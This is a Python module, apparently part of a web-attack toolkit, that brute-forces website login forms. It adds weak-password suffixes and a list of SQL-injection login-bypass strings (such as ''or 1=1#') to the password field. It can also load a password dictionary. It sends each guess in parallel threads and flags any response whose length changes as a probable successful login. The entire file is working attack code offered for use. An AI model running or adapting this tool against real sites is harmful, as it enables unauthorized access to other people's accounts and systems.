#!/usr/bin/python
# -*- coding:utf8 -*-
#author:Jinhao

import requests
import os,re
from concurrent.futures import ThreadPoolExecutor
from reports import reports

weak_dict = ['123', '888', '@123', '666']  # 常用弱密码后缀
sql_pass = ['\'or 1=1#', '"or 1=1#', '\')or 1=1#', 'or 1=1--', 'a\'or\'1=1--', '\'OR 1=1%00']  # sql万能密码
payload = weak_dict+sql_pass
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
}

class Login:
    def __init__(self,url,file,threads,flag):
        self.url = url
        self.file = file
        self.threads = threads
        self.flag = flag
        self.start()

    def start(self):
        exp = []
        print('>>>>>Login_fuzz'+'-'*40)
        print('[ tips:有很多payload文件保存在./dict/login目录下 ]')
        usr = self.check_null(input('请输入用户名参数信息 [username=admin]\n'),'username')
        pwd = self.check_null(input('请输入密码参数信息 [password=admin]\n'),'password')
        print('[ 初始参数：{}&{} ]'.format(usr,pwd))
        exp = self.add_payload(usr,pwd,payload)
        if self.file or self.flag:
            payloads = self.load_file(self.file)
            if payloads:
                print('[ payload导入完成 ]')
                exp += self.set_payload(usr, pwd, payloads)
            else:
                print('[ payload导入失败 ]')
        # print(exp)
        report = self.run(exp)
        if report:
            reports.Report(report, self.url, 'login_report.txt', '网站密码fuzz报告已存放于', '没有探测出网站密码')
        else:
            print('[ 没有探测出网站密码 ]')
        print('-'*40+'Login_fuzz<<<<<')


    def load_file(self,file):
        '''
        加载指定payload
        :param file:
        :return:
        '''
        payload = []
        path = os.path.dirname(__file__)
        if file:
            try:
                F = open(file, 'r')
                for x in F:
                    payload.append(x.replace('\n', ''))
                return payload
            except:
                return

        else:
            file = 'password.txt'
            filepath = "{0}/{1}/{2}".format(path, r'../dict/login', file)
            F = open(filepath, 'r')
            for x in F:
                payload.append(x.replace('\n', ''))

        payload = list(set(payload))   # payload去重
        return payload

    def check_null(self,param,data):
        '''
        参数设置
        :param param:
        :return:
        '''
        p = re.compile('(.+)=(.+)')
        if p.match(param):
            return param
        if param:
            param = '{}={}'.format(data,param)
            return param
        param = '{}=admin'.format(data)
        return param

    def add_payload(self,usr,pwd,payloads):
        '''
        拼接payload
        :param usr:
        :param pwd:
        :param payloads:
        :return:
        '''
        exp = []
        u_param = usr.split('=')[0]
        u_data = usr.split('=')[1]
        p_param = pwd.split('=')[0]
        p_data = pwd.split('=')[1]
        try:
            self.len = len(requests.post(self.url,data={u_param:u_data,p_param:p_data},headers=headers,timeout=5).content)   # 设置默认网站长度
        except:
            self.len = len(requests.post(self.url, data={u_param: u_data, p_param: p_data}, headers=headers,
                                         timeout=20).content)  # 设置默认网站长度
        for x in payloads:
            data = {
                u_param: u_data,
                p_param: p_data+x
            }
            exp.append(data)
        return exp


    def set_payload(self,usr,pwd,payloads):
        '''
        设置exp
        :param usr:
        :param pwd:
        :param payloads:
        :return:
        '''
        exp = []
        u_param = usr.split('=')[0]
        u_data = usr.split('=')[1]
        p_param = pwd.split('=')[0]
        p_data = pwd.split('=')[1]

        for x in payloads:
            data = {
                u_param : u_data,
                p_param : x
            }
            exp.append(data)
        return exp


    def run(self,exp):
        '''
        多线程跑fuzz
        :param exp:
        :return:
        '''
        report = []
        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            results = pool.map(self.fuzz,exp)
            for result in results:
                if result['flag'] == 1:
                    print(result['msg'])
                    report.append(result['msg'])
        return report


    def fuzz(self,data):
        '''
        fuzz模块
        :param data:
        :return:
        '''
        try:
            res = requests.post(self.url,data=data,headers=headers,timeout=5).content
            if len(res) != self.len:
                msg = {'flag':1,'msg':data}
                return msg
        except:
            msg = {'flag':0}
            return msg

